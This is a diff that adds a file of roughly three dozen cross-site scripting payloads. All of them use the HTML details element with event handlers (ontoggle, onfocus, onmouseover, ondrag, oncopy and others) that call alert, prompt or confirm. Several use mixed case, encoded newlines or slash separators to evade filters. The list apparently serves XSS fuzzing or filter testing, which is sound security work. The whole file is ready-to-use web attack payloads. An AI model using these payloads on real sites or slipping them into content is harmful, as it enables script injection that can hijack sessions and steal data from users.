@@ -1,0 +1,36 @@
+<dETAILS%0aopen%0aonToGgle%0a=%0aa=prompt,a() x>
+<details draggable="true" ondrag="alert(1)">test</details>
+<details draggable="true" ondragend="alert(1)">test</details>
+<details draggable="true" ondragenter="alert(1)">test</details>
+<details draggable="true" ondragleave="alert(1)">test</details>
+<details draggable="true" ondragstart="alert(1)">test</details>
+<details id=x tabindex=1 onactivate=alert(1)></details>
+<details id=x tabindex=1 onbeforeactivate=alert(1)></details>
+<details id=x tabindex=1 onbeforedeactivate=alert(1)></details><input autofocus>
+<details id=x tabindex=1 ondeactivate=alert(1)></details><input id=y autofocus>
+<details id=x tabindex=1 onfocus=alert(1)></details>
+<details id=x tabindex=1 onfocusin=alert(1)></details>
+<details onbeforecopy="alert(1)" contenteditable>test</details>
+<details onbeforecut="alert(1)" contenteditable>test</details>
+<details onbeforepaste="alert(1)" contenteditable>test</details>
+<details onblur=alert(1) tabindex=1 id=x></details><input autofocus>
+<details onclick="alert(1)">test</details>
+<details oncontextmenu="alert(1)">test</details>
+<details oncopy="alert(1)" contenteditable>test</details>
+<details oncut="alert(1)" contenteditable>test</details>
+<details ondblclick="alert(1)">test</details>
+<details onfocusout=alert(1) tabindex=1 id=x></details><input autofocus>
+<details onkeydown="alert(1)" contenteditable>test</details>
+<details onkeypress="alert(1)" contenteditable>test</details>
+<details onkeyup="alert(1)" contenteditable>test</details>
+<details onmousedown="alert(1)">test</details>
+<details onmouseenter="alert(1)">test</details>
+<details onmouseleave="alert(1)">test</details>
+<details onmousemove="alert(1)">test</details>
+<details onmouseout="alert(1)">test</details>
+<details onmouseover="alert(1)">test</details>
+<details onmouseup="alert(1)">test</details>
+<details onpaste="alert(1)" contenteditable>test</details>
+<details ontoggle=alert(1) open>test</details>
+<deTAiLs/open/oNtoGGle=confirm()>
+<details/open/ontoggle=confirm('XSS')>
